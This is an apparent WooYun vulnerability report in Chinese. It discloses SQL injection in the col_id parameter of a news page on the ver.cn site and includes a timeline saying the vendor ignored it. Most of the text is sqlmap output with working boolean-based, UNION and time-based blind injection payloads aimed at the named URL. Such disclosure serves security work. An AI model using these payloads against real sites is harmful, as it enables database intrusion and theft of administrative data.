wybug_title: 盒子世界存在SQL注入可泄露大量管理信息
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-04-20：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-06-04：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 信息泄露简直巨大 详细说明：  http://www.ver.cn/news/news_detail.php?col_id=3234
Place: GETParameter: col_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: col_id=3234 AND 9307=9307    Type: UNION query    Title: MySQL UNION query (NULL) - 4 columns    Payload: col_id=-9668 UNION ALL SELECT NULL,NULL,CONCAT(0x716a726471,0x4146735069577a6e456b,0x71706b6271),NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: col_id=3234 AND SLEEP(5)---[19:27:25] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11
